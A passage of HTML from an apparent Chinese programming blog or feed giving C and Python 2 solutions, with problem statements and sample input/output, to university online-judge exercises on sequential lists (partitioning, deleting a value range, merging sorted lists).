class="title">initlist</span><span class="params">(sqlist <em>&amp;L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    L-&gt;length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(sqlist <em>&amp;L,<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;L-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">movlist</span><span class="params">(sqlist <em>&amp;L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p=L-&gt;data[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=L-&gt;length<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i–)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(L-&gt;data[i]&lt;=p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">“%d “</span>,L-&gt;data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;L-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(L-&gt;data[i]&gt;p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">“%d “</span>,L-&gt;data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqlist la;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    initlist(la);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    creatlist(la,n);</span><br><span class="line">    movlist(la);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><h1 id="1103-删除顺序表中指定区间的数据"><a href="#1103-删除顺序表中指定区间的数据" class="headerlink" title="[1103] 删除顺序表中指定区间的数据"></a>[1103] 删除顺序表中指定区间的数据</h1><div class="tabs" id="1103"><ul class="nav-tabs"><li class="tab active"><a href="#1103-1">思路</a></li><li class="tab"><a href="#1103-2">题目描述</a></li><li class="tab"><a href="#1103-3">python代码实现</a></li><li class="tab"><a href="#1103-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="1103-1"><div class="note default"><blockquote><br><p>比较、删除</p><br></blockquote></div></div><div class="tab-pane" id="1103-2"><p><a href="http://acm.swust.edu.cn/#/problems/1103/-1?_k=3icr2e" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立顺序表L，将指定区间的数据从顺序表中删除。假设指定区间是合法数据，无序做合法性判断。测试数据为整型。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行是表长n；<br>第二行是表中数据元素。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>删除以后的顺序表中的数据元素。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">22</span> <span class="number">32</span> <span class="number">11</span> <span class="number">23</span> <span class="number">43</span> <span class="number">59</span> <span class="number">17</span> <span class="number">65</span> <span class="number">45</span> <span class="number">57</span></span><br><span class="line"><span class="number">10</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> <span class="number">32</span> <span class="number">23</span> <span class="number">43</span> <span class="number">59</span> <span class="number">65</span> <span class="number">45</span> <span class="number">57</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1103-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = []</span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">    <span class="keyword">if</span> a[i] &lt; x[<span class="number">0</span>] <span class="keyword">or</span> a[i] &gt; x[<span class="number">1</span>]:</span><br><span class="line">        print a[i],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1103-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    elemtype data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(sqlist <em>&amp;L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    L-&gt;length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(sqlist <em>&amp;L,<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;L-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">movlist</span><span class="params">(sqlist <em>&amp;L,<span class="keyword">int</span> a,<span class="keyword">int</span> b)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p=L-&gt;data[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;L-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(L-&gt;data[i]&lt;a||L-&gt;data[i]&gt;b)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%d “</span>,L-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqlist la;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    initlist(la);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    creatlist(la,n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d%d”</span>,&amp;a,&amp;b);</span><br><span class="line">    movlist(la,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#注意：学校oj python所用的是python2，用python3交会报CE 不要问我怎么知道的，当你有满屏CE的时候，你会知道的。&lt;/p&gt;
&lt;h1 id=&quot;941-有序顺序表的合并操作的实现&quot;&gt;&lt;a href=&quot;#941-有序顺序表的合并操作的实现&quot; class=&quot;headerlink&quot; title=&quot;[941] 有序顺序表的合并操作的实现&quot;&gt;&lt;/a&gt;[941] 有序顺序表的合并操作的实现&lt;/h1&gt;&lt;div class=&quot;tabs&quot; id=&quot;941&quot;&gt;&lt;ul class=&quot;nav-tabs&quot;&gt;&lt;li class=&quot;tab active&quot;&gt;&lt;a href=&quot;#941-1&quot;&gt;思路&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;tab&quot;&gt;&lt;a href=&quot;#941-2&quot;&gt;题目描述&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;tab&quot;&gt;&lt;a href=&quot;#941-3&quot;&gt;python代码实现&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;tab&quot;&gt;&lt;a href=&quot;#941-4&quot;&gt;数据结构实现&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;tab-content&quot;&gt;&lt;div class=&quot;tab-pane active&quot; id=&quot;941-1&quot;&gt;&lt;div class=&quot;note default&quot;&gt;&lt;blockquote&gt;&lt;br&gt;&lt;p&gt;比较a列表和b列表的大小，然后按顺序放到 c列表里&lt;/p&gt;&lt;br&gt;&lt;/blockquote&gt;&lt;/div&gt;
&lt;/div&gt;&lt;div class=&quot;tab-pane&quot; id=&quot;941-2&quot;&gt;&lt;p&gt;&lt;a href=&quot;http://acm.swust.edu.cn/#/problems/941/341?_k=ve00av&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;已知两非递减的顺序线性表，要求合并成一个新的非递减顺序线性表。(测试数据为整型)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;输入&quot;&gt;&lt;a href=&quot;#输入&quot; class=&quot;headerlink&quot; title=&quot;输入&quot;&gt;&lt;/a&gt;输入&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;输入包含四行，第一行为自然数n，表示第一个非递减顺序线性表的长度;&lt;br&gt;第二行为n个自然数构成的非递减顺序线性表;&lt;br&gt;第三行为自然数m，表示第二个非递减顺序线性表的长度;&lt;br&gt;第四行为m个自然数构成的非递减顺序线性表&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;输出&quot;&gt;&lt;a href=&quot;#输出&quot; class=&quot;headerlink&quot; title=&quot;输出&quot;&gt;&lt;/a&gt;输出&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;用一行输出合并后的非递减顺序线性表，各数之间用一个空格隔开。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;样例输入&quot;&gt;&lt;a href=&quot;#样例输入&quot; class=&quot;headerlink&quot; title=&quot;样例输入&quot;&gt;&lt;/a&gt;样例输入&lt;/h3&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;样例输出&quot;&gt;&lt;a href=&quot;#样例输出&quot; class=&quot;headerlink&quot; title=&quot;样例输出&quot;&gt;&lt;/a&gt;样例输出&lt;/h3&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/div&gt;&lt;div class=&quot;tab-pane&quot; id=&quot;941-3&quot;&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;a = []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n1 = &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;(input())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a = &lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;,raw_input().split()))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;b = []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n2 = &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;(input())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;b = &lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;,raw_input().split()))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;len_a = len(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;len_b = len(b)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;la, lb = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c = []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; la &amp;lt; len_a &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; lb &amp;lt; len_b:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; a[la] &amp;lt; b[lb]:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        c.append(a[la])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        la += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        c.append(b[lb])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lb += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; la &amp;lt; len_a:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    c.append(a[la])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    la += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; lb &amp;lt; len_b:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    c.append(b[lb])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lb += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i in range(la + lb):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print c[i],&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/div&gt;&lt;div class=&quot;tab-pane&quot; id=&quot;941-4&quot;&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span 